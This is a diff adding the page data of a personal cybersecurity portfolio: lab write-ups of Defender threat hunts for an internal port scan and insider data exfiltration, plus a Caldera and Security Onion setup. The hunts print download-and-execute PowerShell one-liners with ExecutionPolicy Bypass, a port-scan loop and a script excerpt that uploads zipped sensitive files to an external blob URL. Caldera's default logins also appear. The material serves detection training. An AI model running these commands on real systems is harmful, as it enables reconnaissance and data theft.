@@ -1,0 +1,579 @@
+1:"$Sreact.fragment"
+2:I[9304,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","52","static/chunks/52-dc2ebebf60073ec5.js","309","static/chunks/309-3e43f9b66d438df9.js","945","static/chunks/945-2a14fe9ed70b235a.js","916","static/chunks/916-d000ae8515890a43.js","794","static/chunks/794-40a14984f3a6b1a7.js","177","static/chunks/app/layout-020809086aa700bb.js"],"ThemeProvider"]
+3:I[9241,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","52","static/chunks/52-dc2ebebf60073ec5.js","309","static/chunks/309-3e43f9b66d438df9.js","945","static/chunks/945-2a14fe9ed70b235a.js","916","static/chunks/916-d000ae8515890a43.js","794","static/chunks/794-40a14984f3a6b1a7.js","177","static/chunks/app/layout-020809086aa700bb.js"],"CyberHeader"]
+4:I[7555,[],""]
+5:I[1295,[],""]
+6:I[1024,["542","static/chunks/542-9c169102c7286aba.js","838","static/chunks/838-83c262eea6b250cb.js","345","static/chunks/app/not-found-f26a84874965db45.js"],"default"]
+7:I[3063,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","52","static/chunks/52-dc2ebebf60073ec5.js","309","static/chunks/309-3e43f9b66d438df9.js","945","static/chunks/945-2a14fe9ed70b235a.js","916","static/chunks/916-d000ae8515890a43.js","794","static/chunks/794-40a14984f3a6b1a7.js","177","static/chunks/app/layout-020809086aa700bb.js"],"Image"]
+8:I[6874,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","52","static/chunks/52-dc2ebebf60073ec5.js","309","static/chunks/309-3e43f9b66d438df9.js","945","static/chunks/945-2a14fe9ed70b235a.js","916","static/chunks/916-d000ae8515890a43.js","794","static/chunks/794-40a14984f3a6b1a7.js","177","static/chunks/app/layout-020809086aa700bb.js"],""]
+a:I[9665,[],"OutletBoundary"]
+d:I[9665,[],"ViewportBoundary"]
+f:I[9665,[],"MetadataBoundary"]
+11:I[6614,[],""]
+:HL["/_next/static/css/78204a441d290532.css","style"]
+:HL["/_next/static/css/b5c3a1bf19425f6c.css","style"]
+0:{"P":null,"b":"ueOktod6GdedqcxtLheow","p":"","c":["","projects","project-5-2-log-n-pacific-internship-threat-hunting-scenario2",""],"i":false,"f":[[["",{"children":["projects",{"children":[["slug","project-5-2-log-n-pacific-internship-threat-hunting-scenario2","d"],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",true],["",["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/78204a441d290532.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}],["$","link","1",{"rel":"stylesheet","href":"/_next/static/css/b5c3a1bf19425f6c.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","suppressHydrationWarning":true,"children":[["$","head",null,{"children":["$","script",null,{"defer":true,"src":"https://cloud.umami.is/script.js","data-website-id":"1c0f224c-1fe0-4093-a4e2-c43cb8c84bfa"}]}],["$","body",null,{"className":"__className_f367f3","children":["$","$L2",null,{"attribute":"class","defaultTheme":"light","disableTransitionOnChange":true,"children":["$","div",null,{"className":"flex min-h-screen flex-col","children":[["$","$L3",null,{}],["$","main",null,{"className":"flex-1 pt-16","children":["$","$L4",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L5",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[["$","$L6",null,{}],[]],"forbidden":"$undefined","unauthorized":"$undefined"}]}],["$","footer",null,{"className":"bg-background py-5 border-t border-border","children":["$","div",null,{"className":"container mx-auto px-4 md:px-6","children":[["$","div",null,{"className":"grid grid-cols-1 md:grid-cols-3 gap-4","children":[["$","div",null,{"className":"space-y-2","children":[["$","div",null,{"className":"flex items-center","children":["$","div",null,{"className":"relative w-[3.6rem] h-[3.6rem]","children":["$","$L7",null,{"src":"https://hebbkx1anhila5yf.public.blob.vercel-storage.com/117%20Corporation%20no%20bg-5VVBXF0igK8jcCo43su7cpA2isco7t.png","alt":"117 SECOPS Logo","fill":true,"className":"object-contain"}]}]}],["$","p",null,{"className":"text-sm text-muted-foreground max-w-xs","children":"Cybersecurity professional specializing in protecting digital assets from evolving threats."}],["$","div",null,{"className":"pt-0","children":["$","a",null,{"href":"https://www.linkedin.com/in/otori-samson/","target":"_blank","rel":"noopener noreferrer","children":"Contact Me","className":"inline-flex items-center justify-center whitespace-nowrap text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-9 rounded-md px-3 cyber-border bg-transparent text-foreground hover:bg-purple-600 hover:text-white","ref":null}]}]]}],["$","div",null,{"children":[["$","h3",null,{"className":"font-medium text-sm mb-2 text-foreground","children":"Quick Links"}],["$","ul",null,{"className":"space-y-0.5","children":[["$","li",null,{"children":["$","$L8",null,{"href":"/","className":"text-sm text-muted-foreground hover:text-primary","children":"Home"}]}],["$","li",null,{"children":["$","$L8",null,{"href":"/blog","className":"text-sm text-muted-foreground hover:text-primary","children":"Blog"}]}],["$","li",null,{"children":["$","$L8",null,{"href":"/projects","className":"text-sm text-muted-foreground hover:text-primary","children":"Projects"}]}],["$","li",null,{"children":["$","$L8",null,{"href":"/portfolio","className":"text-sm text-muted-foreground hover:text-primary","children":"Portfolio"}]}],["$","li",null,{"children":["$","$L8",null,{"href":"/about","className":"text-sm text-muted-foreground hover:text-primary","children":"About"}]}]]}]]}],["$","div",null,{"children":[["$","h3",null,{"className":"font-medium text-sm mb-2 text-foreground","children":"Areas of Expertise"}],["$","ul",null,{"className":"space-y-0.5","children":[["$","li",null,{"className":"text-sm text-muted-foreground","children":"Security Assessment"}],["$","li",null,{"className":"text-sm text-muted-foreground","children":"Penetration Testing"}],["$","li",null,{"className":"text-sm text-muted-foreground","children":"Secure Development"}],["$","li",null,{"className":"text-sm text-muted-foreground","children":"Incident Response"}],["$","li",null,{"className":"text-sm text-muted-foreground","children":"Compliance"}]]}]]}]]}],["$","div",null,{"className":"border-t border-border mt-5 pt-3 flex flex-col md:flex-row justify-between items-center","children":["$","p",null,{"className":"text-sm text-muted-foreground","children":["© ",2025," Samson's. Personal cybersecurity portfolio."]}]}]]}]}]]}]}]}]]}]]}],{"children":["projects",["$","$1","c",{"children":[null,["$","$L4",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L5",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":[["slug","project-5-2-log-n-pacific-internship-threat-hunting-scenario2","d"],["$","$1","c",{"children":[null,["$","$L4",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L5",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":["__PAGE__",["$","$1","c",{"children":["$L9","$undefined",null,["$","$La",null,{"children":["$Lb","$Lc",null]}]]}],{},null,false]},null,false]},null,false]},null,false],["$","$1","h",{"children":[null,["$","$1","RSKiO0B4UyTzXg8poxJXg",{"children":[["$","$Ld",null,{"children":"$Le"}],null]}],["$","$Lf",null,{"children":"$L10"}]]}],false]],"m":"$undefined","G":["$11","$undefined"],"s":false,"S":true}
+12:I[2238,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","842","static/chunks/842-e0e5a1d477d9d65d.js","150","static/chunks/150-c359029d3b689678.js","419","static/chunks/app/projects/%5Bslug%5D/page-41cd4d27245b4b70.js"],"default"]
+13:T33cd,
+## Introduction
+
+This threat hunting exercise was focused on investigating a sudden and unexplained network slowdown observed within a simulated enterprise lab environment. Using Microsoft Defender for Endpoint (MDE), the purpose of this hunt was to determine whether the performance degradation was caused by malicious internal activity, excessive resource usage, or misconfigured systems.
+
+The environment consisted of my onboarded virtual machine named samson-windows-1, which was actively reporting telemetry to Microsoft Defender for Endpoint. The goal was to use real-time logs and threat hunting queries to identify abnormal behaviors that could suggest internal reconnaissance, port scanning, or other unauthorized actions within the network.
+
+This scenario demonstrates a practical application of endpoint detection and response (EDR) data in uncovering internal security issues and applying structured analysis techniques to isolate potential causes.
+
+## Scenario Overview
+
+The issue began when the server team observed an overall slowdown across multiple legacy devices in the 10.0.0.0/16 subnet. External DDoS attacks were ruled out, meaning the cause was likely internal. The unrestricted internal network environment, where all hosts could communicate freely and PowerShell was allowed without restriction, created a perfect scenario for internal misuse or exploitation.
+
+The working hypothesis for this hunt was that one of the systems inside the local network could have been performing unauthorized port scanning or large data transfers, which would naturally create latency or bandwidth congestion. The objective was to identify the specific device responsible for this unusual activity and determine whether it was a deliberate or automated action.
+
+## Preparation
+
+Before starting the hunt, I ensured that my virtual machine, samson-windows-, was properly onboarded to Microsoft Defender for Endpoint. Once confirmed, I simulated an internal event by executing a PowerShell command designed to initiate a controlled port scan within the local subnet. This step was necessary to generate realistic logs for analysis, mimicking what a real-world internal threat might look like.
+
+<InlineGallery images={vm-setup-onboarding} title="VM Setup and Microsoft Defender Onboarding Process" />
+
+### PowerShell Command
+-------------------------------------------------------------------------
+powershell
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1' -OutFile 'C:\programdata\portscan.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
+-------------------------------------------------------------------------
+
+This PowerShell command downloaded and executed a script that scanned a range of IPs within the 10.0.0.x subnet, sequentially probing ports on other devices. In a real enterprise setting, this would represent a potential reconnaissance operation, something commonly done by attackers or misconfigured tools trying to map network exposure.
+
+After executing the command, I allowed several minutes for the resulting logs to populate in Microsoft Defender for Endpoint's hunting tables. The preparation phase was crucial, as it ensured that the system had generated enough telemetry to analyze behaviors such as failed connection attempts, sequential port scanning, and process execution traces.
+
+## Data Collection
+
+Once the environment was prepared, the next phase involved verifying that telemetry data was actively being received across the three key Defender tables: DeviceNetworkEvents, DeviceFileEvents, and DeviceProcessEvents.
+
+I began by executing a simple query to confirm that new logs were flowing in correctly. By ordering results by timestamp and taking the most recent entries, I could confirm that MDE was actively collecting data and that there were no ingestion delays.
+
+### KQL Check for Recent Network Logs
+------------------------------------------------------------------------
+kql
+DeviceNetworkEvents
+| order by Timestamp desc
+| take 10
+------------------------------------------------------------------------
+
+The timestamps confirmed that logs were being generated in real time. Having verified the data sources, I was confident that the environment was providing the necessary visibility to conduct meaningful analysis.
+
+In a real security operations environment, this phase mimics ensuring that sensors and logging mechanisms are functioning correctly before an investigation begins. Without fresh telemetry, an analyst could end up drawing conclusions from outdated or incomplete information.
+
+## Data Analysis
+
+The analysis phase began with looking for signs of network anomalies, specifically focusing on connection attempts that had either failed or succeeded in large quantities. A sudden burst of such activity could be indicative of scanning or enumeration attempts within the network.
+
+### KQL – Count Failed Connections
+------------------------------------------------------------------------
+kql
+DeviceNetworkEvents
+| where ActionType == "ConnectionFailed"
+| summarize FailedConnectionsAttempts = count() by DeviceName, ActionType, LocalIP, RemoteIP
+| order by FailedConnectionsAttempts desc
+------------------------------------------------------------------------
+
+When the results came back, the data immediately pointed to samson-windows- as the primary contributor to abnormal connection failures. The logs revealed that the device had failed over a hundred connection attempts, some directed at its own IP address and others toward another host in the subnet. Such behavior was a strong indicator of either misconfiguration or automated probing.
+
+To further understand the scope of the activity, I drilled down into specific IP addresses that exhibited the highest failure rates. This approach mirrors a real-world scenario where analysts pivot from a general pattern to a specific anomaly for deeper inspection.
+
+### KQL – Inspect All Failed Connections from a Specific IP
+------------------------------------------------------------------------
+kql
+let IPInQuestion = "10.0.0.5";
+DeviceNetworkEvents
+| where ActionType == "ConnectionFailed"
+| where LocalIP == IPInQuestion
+| order by Timestamp desc
+------------------------------------------------------------------------
+
+Upon reviewing the sequence of failed connection attempts, it became clear that the remote ports being contacted followed a sequential pattern: ports 21, 23, 25, 53, 80, 110, 443, and others. This pattern matched the signature of a port scanning activity, which is typically used to identify open services running across hosts. Sequential probing of well-known ports is rarely accidental and often indicates reconnaissance or mapping behavior within the network.
+
+At this stage, I had high confidence that the slowdown was caused by internal scanning originating from the samson-windows- VM.
+
+<InlineGallery images={network-investigation-analysis} title="Network Investigation and Analysis Process" />
+
+## Investigation
+
+To confirm the origin of this suspicious activity, I pivoted to the DeviceProcessEvents table to look for the process responsible for initiating these connections. By focusing on a specific time window surrounding the detected network anomalies, I aimed to identify any executable or script that matched the port scanning behavior.
+
+### KQL – Correlate Process Activity around the Port Scan Time
+------------------------------------------------------------------------
+kql
+let VMName = "samson-windows-";
+let specificTime = datetime(2025-10-12T13:15:03.9576325Z);
+DeviceProcessEvents
+| where Timestamp between ((specificTime - 10m) .. (specificTime + 10m))
+| where DeviceName == VMName
+| order by Timestamp desc
+| project Timestamp, FileName, InitiatingProcessCommandLine
+------------------------------------------------------------------------
+
+The query output revealed that a PowerShell script named portscan.ps1 had been executed under the System account. This was a significant finding because the System account generally has administrative-level privileges and is not typically used to execute network scanning scripts.
+
+Upon logging into the VM, I located the file in C:\ProgramData\portscan.ps1 and reviewed its contents. The script was intentionally scanning hosts in the subnet, sequentially testing common ports. This confirmed that the slowdown was caused by repeated internal scanning initiated by the PowerShell script.
+
+### Snippet of the observed PowerShell script:
+------------------------------------------------------------------------
+powershell
+for ($i=4; $i -le 10; $i++) {
+   Test-NetConnection "10.0.0.$i" -Port 21,23,25,53,80,110,443
+}
+------------------------------------------------------------------------
+
+Since the script was running under the System account and not triggered by an identifiable user, I concluded that the activity was automated and potentially malicious. I proceeded to isolate the samson-windows- VM from the network using Defender for Endpoint's built-in Isolate Device feature.
+
+After isolating the system, I ran a full malware scan to check for persistence mechanisms or additional payloads. The scan returned clean, but ideally you are to request a full rebuild of the VM. In a production setting, this step ensures that any potential hidden or dormant artifacts are fully removed.
+
+<InlineGallery images={port-scan-investigation-isolation} title="Port Scan Investigation and Device Isolation Process" />
+
+## Response and MITRE ATT&CK Mapping
+
+This scenario corresponded with several techniques in the MITRE ATT&CK Framework, helping align the observed activity with recognized adversarial tactics:
+
+1. **Reconnaissance (T1046 – Network Service Scanning)**: The port scanning activity represented a clear attempt to enumerate open services.
+2. **Execution (T1059.001 – PowerShell)**: The PowerShell script was used as the execution medium for network probing.
+3. **Privilege Escalation (T1078 – Valid Accounts / System Context)**: The script ran under the System account, suggesting a high privilege level.
+4. **Lateral Movement (T1021 – Remote Services)**: The scanning pattern indicated attempts to discover reachable hosts for potential lateral movement.
+
+By isolating the device, scanning for malware, and scheduling a reimage, the risk of any further impact was neutralized.
+
+## Documentation
+
+Throughout the course of this investigation, I documented every major step and observation to ensure a clear understanding of how the event unfolded. The investigation began with an initial hypothesis of possible internal misuse, which evolved into the discovery of systematic port scanning. Each query used in Defender for Endpoint was recorded alongside its findings to form an evidence trail.
+
+This documentation not only captured the technical steps taken, such as verifying logs, pivoting between tables, and confirming the script execution but also reflected the reasoning behind each action. Maintaining detailed documentation like this allows for transparency, consistency, and reproducibility in future hunts. It also helps build reference material that can be used by other analysts for similar incidents, ensuring the organization's knowledge base grows with every investigation.
+
+## Improvement
+
+After analyzing the entire scenario, several improvement points were identified. First, it became clear that PowerShell execution policies were too relaxed in this environment. Restricting PowerShell to only run signed scripts would immediately reduce the risk of arbitrary script execution.
+
+Second, the internal network lacked segmentation, allowing one compromised host to communicate freely with all others. In a real corporate setup, proper network segmentation would ensure that unnecessary east-west traffic is limited and monitored.
+
+Third, implementing automated alerting for abnormal internal traffic patterns, such as repeated connection failures to sequential ports, would enable the SOC team to detect similar behavior earlier. Additionally, conducting proactive threat hunts on a routine basis helps catch reconnaissance activities before they evolve into actual compromise events.
+
+Ultimately, this scenario reinforced the importance of combining technical detection with procedural discipline, ensuring every hunt improves the overall security posture of the environment.
+
+## Conclusion
+
+The sudden network slowdown was traced to a PowerShell-based port scanning script executed under the System account on samson-windows-. Although no active compromise was found, the activity realistically simulated how internal reconnaissance could degrade performance and increase exposure within an unrestricted network.
+
+This hunt demonstrated the power of Microsoft Defender for Endpoint in identifying behavioral anomalies, correlating telemetry across different data sources, and facilitating immediate containment actions.
+
+Through structured investigation and methodical documentation, this exercise emphasized how internal misconfigurations or unauthorized automation can lead to observable network symptoms, and how disciplined threat hunting can quickly uncover their root cause.
+
+14:T27da,
+## Introduction
+
+This threat-hunting exercise focused on investigating a suspected case of data exfiltration within a simulated enterprise environment. The scenario revolved around a disgruntled employee placed on a Performance Improvement Plan (PIP) who was suspected of archiving and leaking proprietary company data.
+
+The purpose of this hunt was to determine whether the employee's device showed evidence of unauthorized data compression, archiving, or transmission activity. Using Microsoft Defender for Endpoint (MDE), I leveraged multiple telemetry tables and KQL-based threat-hunting techniques to uncover any trace of insider-driven data-exfiltration behavior.
+
+My lab environment consisted of an onboarded Windows VM named samson-windows-, which reported telemetry to MDE in real time. This allowed me to simulate realistic user behavior, analyze relevant forensic artifacts, and document a structured end-to-end threat-hunting process.
+
+## Scenario Overview
+
+The investigation began when management raised a concern about John Doe, an employee in a sensitive department who had recently been placed on a PIP after a workplace altercation. Following the incident, leadership feared that John might attempt to steal sensitive data and resign.
+
+John's workstation, samson-windows-, was configured with administrative privileges and unrestricted PowerShell access, an ideal setup for potential insider misuse. The working hypothesis was that John might have compressed critical data using utilities such as 7-Zip or WinRAR, then attempted to transfer those archives outside the corporate network.
+
+The objective of this threat hunt was to analyze logs, identify any evidence of archiving behavior, and determine whether exfiltration attempts occurred.
+
+## Preparation
+
+Before the analysis, I ensured that the VM (samson-windows-) was successfully onboarded to MDE. Once active, I simulated malicious insider behavior by executing a PowerShell script that automated the compression and simulated upload of internal files. This helped generate realistic telemetry for review.
+
+- Created VM and onboarded to Microsoft Defender for Endpoint
+- RDP connection established to VM
+- Downloaded and ran MDE onboarding package
+- VM successfully reporting in Defender portal
+
+### PowerShell Command
+
+-------------------------------------------------------
+powershell
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1'; cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1
+-------------------------------------------------------
+
+This command downloaded and executed the ExfiltrateData.ps1 script, which silently installed 7-Zip, created compressed archives of sample "employee data," and simulated uploading them to an external Azure storage bucket.
+
+In an enterprise context, this type of activity would strongly suggest unauthorized data handling or insider exfiltration. Allowing the VM to run for several minutes ensured that sufficient telemetry was collected across all relevant MDE tables for subsequent analysis.
+
+## Data Collection
+
+With the environment set up, I verified that Defender for Endpoint was actively ingesting telemetry into the core tables:
+
+- DeviceFileEvents
+- DeviceProcessEvents
+- DeviceNetworkEvents
+
+I ran an initial query to confirm that new records were appearing in real time.
+
+### KQL Check for Recent Logs
+
+-------------------------------------------------------
+kql
+DeviceFileEvents
+| order by Timestamp desc
+| take 10
+-------------------------------------------------------
+
+The query confirmed that logs were fresh and consistent, ensuring that the upcoming threat-hunting queries would analyze live data. In a production SOC, this mirrors the critical validation step before any deep-dive investigation: confirming log integrity and timeliness.
+
+## Data Analysis
+
+The next step was to search for file archiving activities, which could indicate data being staged for exfiltration. To achieve this, I filtered DeviceProcessEvents for any processes linked to known archiving applications such as 7-Zip, WinRAR, or Bandizip.
+
+### KQL – Detect Archive Process Activity
+
+-------------------------------------------------------
+kql
+let archive_applications = dynamic(["winrar.exe","7z.exe","winzip32.exe","peazip.exe","Bandizip.exe","UniExtract.exe","POWERARC.EXE","IZArc.exe","AshampooZIP.exe","FreeArc.exe"]);
+let VMName = "samson-windows-";
+DeviceProcessEvents
+| where FileName has_any(archive_applications)
+| order by Timestamp desc
+-------------------------------------------------------
+
+Within seconds, several 7-Zip executions were observed on samson-windows-, followed by the creation of a suspicious archive named employee_data.zip. The events revealed a sequence of file creations and renames inside C:\ProgramData\Backup\, suggesting automation.
+
+Each entry was timestamped at predictable intervals, reinforcing the possibility of a scripted operation.
+
+## Investigation
+
+To understand the sequence of events more deeply, I pivoted to the DeviceProcessEvents table to identify which process spawned 7-Zip and to the DeviceFileEvents table to trace archive creation activity.
+
+### KQL – Correlate File and Process Activity
+
+-------------------------------------------------------
+kql
+let VMName = "samson-windows-";
+let specificTime = datetime(2025-10-14T18:42:10.5615171Z);
+DeviceProcessEvents
+| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
+| where DeviceName == VMName
+| order by Timestamp desc
+| project Timestamp, FileName, InitiatingProcessCommandLine
+-------------------------------------------------------
+
+This query identified a PowerShell script named exfiltrate_data.ps1 executed under the System account, which silently installed 7-Zip and then created the archive. The log also showed a follow-up PowerShell command initiating a network connection immediately after compression, a strong indicator of data exfiltration.
+
+Upon reviewing the VM's filesystem, I located the script at C:\ProgramData\exfiltratedata.ps1. Its content confirmed automated behavior: downloading, archiving, and attempting to upload files to an external endpoint.
+
+<InlineGallery images={data-exfiltration-detection-analysis} title="Data Exfiltration Detection and Analysis Process" />
+
+### Snippet of the Observed PowerShell Script
+
+Simplified excerpt of ExfiltrateData.ps1
+
+-------------------------------------------------------
+powershell
+Start-Process "7z.exe" -ArgumentList "a", "C:\ProgramData\Backup\employee_data.zip", "C:\SensitiveFiles*"
+Invoke-WebRequest -Uri "https://storageaccount.blob.core.windows.net/container/employee_data.zip" -Method Put -InFile "C:\ProgramData\Backup\employee_data.zip"
+-------------------------------------------------------
+
+The script structure and timing aligned perfectly with the MDE logs, validating that a scripted 7-Zip operation had occurred. While no explicit network event confirmed the upload due to logging limitations, the sequence strongly suggested an attempted data transfer.
+
+## Response and MITRE ATT&CK Mapping
+
+This activity mapped directly to several tactics within the MITRE ATT&CK Framework:
+
+1. **T1059.001 – PowerShell (Execution)**: PowerShell was used to install and execute the archiving utility.
+2. **T1560 – Archive Collected Data (Collection)**: 7-Zip was used to compress sensitive data.
+3. **T1074 – Data Staged (Collection)**: Archives were staged locally in C:\ProgramData\Backup\.
+4. **T1048 – Exfiltration Over Alternative Protocol (Exfiltration)**: The script attempted HTTP PUT operations to Azure Blob storage.
+5. **T1082 – System Information Discovery (Discovery)**: System metadata was queried before execution.
+
+Upon discovering the activity, I isolated samson-windows- using Defender for Endpoint's "Isolate Device" feature to prevent further data loss. A subsequent malware scan returned no persistent threats; however, standard protocol would dictate re-imaging the endpoint for assurance.
+
+## Documentation
+
+Every step of this hunt should meticulously be documented from initial hypothesis through evidence gathering and correlation. All queries, findings, timestamps, and reasoning should be logged to ensure transparency and repeatability.
+
+This approach mirrors a real-world SOC investigation, where maintaining a chronological record of queries and findings is crucial for post-incident reviews and audits. It also supports organizational learning by building an internal knowledge repository for future hunts.
+
+## Improvement
+
+Following the investigation, several security improvements were identified for the environment:
+
+1. **Restrict PowerShell Execution Policies**: Limit execution to signed scripts only.
+2. **Apply Data Loss Prevention (DLP) Controls**: Block unauthorized archive creation and outbound uploads.
+3. **Enable Network Segmentation**: Prevent free east-west traffic between workstations.
+4. **Implement Insider Threat Monitoring**: Establish alerts for mass file compressions or rapid archiving.
+5. **Automate Detection Rules**: Create custom Defender queries to alert when users modify more than N ZIP files within a defined interval.
+
+Together, these recommendations would help detect and contain future insider threat attempts before data is lost.
+
+## Conclusion
+
+This scenario successfully demonstrated how a disgruntled employee with admin rights could use simple PowerShell automation and compression tools to exfiltrate data without triggering traditional antivirus alerts.
+
+Through structured querying in Microsoft Defender for Endpoint and methodical log analysis, I was able to trace the entire activity chain, from script execution to archiving and simulated upload attempts.
+
+This exercise reinforced the importance of monitoring for non-malware abuse of legitimate tools and the necessity of tight endpoint controls to detect and deter insider threats in modern enterprise networks.
+15:T1d16,
+## Project 4.5: Caldera & Security Onion Deployment in my Cybersecurity Home Lab
+
+### Overview
+
+Over the past few weeks, my home lab has been steadily evolving into a fully functional, segmented cybersecurity test environment. Following the blueprint from Gerard O'Brien's Building the Ultimate Cybersecurity Lab series, I've reached one of the most exciting milestones so far: deploying MITRE Caldera for adversary emulation and Security Onion for network-based detection and threat hunting.
+
+Both tools play crucial roles in a mature SOC workflow, and getting them online was a mix of straightforward installs, unexpected technical snags, and valuable troubleshooting lessons.
+
+### Deploying MITRE Caldera
+
+Caldera is an adversary emulation platform developed by MITRE, designed to simulate real-world attacker behaviours and techniques in a controlled environment. The goal in my lab is to use it to generate realistic attack traffic and test detection capabilities across my monitoring stack.
+
+While the transcript in the tutorial followed a clean, predictable installation of Caldera 4.2, my own journey involved a few detours.
+
+### Initial Setup and Configuration
+
+I provisioned a new Ubuntu Server VM in Proxmox with 8GB of RAM, two vCPUs, and a 50GB disk, connected to my VLAN 1 "Security Tools" network. This ensured that Caldera would have unrestricted communication with the rest of my detection infrastructure. The static IP for this server was set to **10.10.5.53**.
+
+After cloning the Caldera repository from GitHub and moving into its directory, I attempted to install dependencies with the command `sudo pip3 install -r requirements.txt`.
+
+### Overcoming Python Environment Issues
+
+This is where I hit the first hurdle. Ubuntu 22.04 now ships with Python in a "externally managed" mode, meaning pip cannot directly install packages system-wide without bypassing the system package manager. The installation aborted with a message advising me to either use apt install for Debian packages or create a Python virtual environment.
+
+The latter was the more controlled option, so I created and activated a virtual environment using these commands:
+
+`python3 -m venv venv`
+`source venv/bin/activate`
+
+With the virtual environment active, pip installed the required packages cleanly. However, the next attempt to start Caldera using this command:
+
+`python3 server.py --insecure --build`
+
+triggered another failure, this time related to a missing npm command. The --build flag instructs Caldera to compile its Vue.js frontend, but this requires Node.js and npm. Installing them inside the VM resolved the problem:
+
+`sudo apt install nodejs npm`
+
+### Final Deployment and Verification
+
+Once Node.js was in place, I ran the build process again. The frontend compiled successfully, but npm threw network timeout errors at one point. This was due to npm's registry connection attempts failing intermittently, which I fixed by retrying the install after confirming the VM's DNS and gateway settings were correct.
+
+Finally, Caldera's web server launched without further issues, listening on port 8888. Accessing **http://10.10.5.53:8888** presented the login interface, where I could sign in as either the red team user (red:admin) or blue team user (blue:admin). This marked the successful deployment of Caldera 4.2, ready for later integration into attack simulation workflows.
+
+<InlineGallery images={caldera-deployment} title="Caldera Deployment Walkthrough" />
+
+### Installing Security Onion
+
+Next came Security Onion, a full-featured open-source platform for network security monitoring, intrusion detection, and threat hunting. Unlike Caldera's lightweight footprint, Security Onion's requirements are substantial—the standalone deployment calls for at least 16GB of RAM, four vCPUs, 200GB of storage, and dual network interfaces.
+
+### System Requirements and Preparation
+
+I created a new Proxmox VM meeting these specs and uploaded the latest Security Onion ISO. The primary NIC was connected to VLAN 1 for management, while a second NIC was reserved for potential sniffing or monitoring duties. Initially, I left the second NIC disconnected during installation to avoid known setup errors.
+
+### Installation Process
+
+The installation process began with selecting "Install Security Onion" and providing a username, password, and other initial setup details. The configuration was set to STANDALONE mode, with the management interface assigned a static IP.
+
+This is where an important adjustment was necessary. In the tutorial, the gateway was set to **10.10.1.254**, but in my network, the correct gateway for VLAN 1 is **10.10.5.254**. Using the wrong gateway would have left the system unable to route traffic correctly. DNS servers included my OPNsense firewall (**192.168.1.1**) and public resolvers (**8.8.8.8, 8.8.4.4**).
+
+After confirming the settings, the installation began, and this was not a quick process. Despite being on modern hardware, Security Onion's post-install configuration took over two hours to complete, performing extensive service installations, database setups, and Elastic Stack provisioning. Patience was essential here.
+
+### Accessing the Platform
+
+When the setup finally completed, I accessed the web interface by navigating to **https://10.10.5.54** from a browser on my management network. Logging in with the credentials created earlier presented the full Security Onion dashboard, ready to begin ingesting data from across the lab.
+
+<InlineGallery images={security-onion-deployment} title="Security Onion Deployment Walkthrough" />
+
+### Conclusion
+
+<p class="mb-4 leading-relaxed">At this point, I had successfully deployed both Caldera and Security Onion in my cybersecurity home lab. Caldera was operational and ready for adversary emulation, while Security Onion was configured for network-based detection and threat hunting. Both tools were integrated within my segmented VLAN architecture, providing a solid foundation for advanced security testing and monitoring.</p>
+
+<p class="mb-4 leading-relaxed">This project showcases the real-world challenges of deploying complex security tools in a home lab environment. The dependency issues with Python's managed mode and the resource-intensive nature of Security Onion highlighted the importance of proper planning and patience in cybersecurity engineering. The next phase will involve integrating these tools with Wazuh, running simulated attack campaigns, and validating that alerts are generated and correlated correctly.</p>
+
+<p class="mb-4 leading-relaxed">Stay tuned for the next stage of this project as we include our Windows Server and Windows 10 environment.</p>
+
+<p class="mb-4 leading-relaxed"><strong class="font-semibold">Credits:</strong> This walkthrough is based on Episode 4 of the Ultimate Cybersecurity Lab YouTube series by Gerard O'Brien. While the steps closely followed his guidance, the project was independently implemented by Samson Otori, with custom network configurations and host assignments tailored to fit a pre-existing VLAN-segmented lab environment.</p>
+
+<p class="mb-4 leading-relaxed">Here's a link to his YouTube channels:</p>
+
+<p class="mb-4 leading-relaxed"><a href="https://www.youtube.com/watch?v=ej6iBrBqZEo" target="_blank" rel="noopener noreferrer" class="text-primary hover:underline">Gerard O'Brien's Channel</a></p>
+16:T20cc,
+# Introduction
+
+As part of my continuous threat hunting practice, I conducted a scenario using Microsoft Defender for Endpoint (MDE) and the Microsoft 365 Security suite. The objective was to investigate devices that may have been unintentionally exposed to the public internet, assess potential brute-force attempts, and determine whether unauthorized access occurred.
+
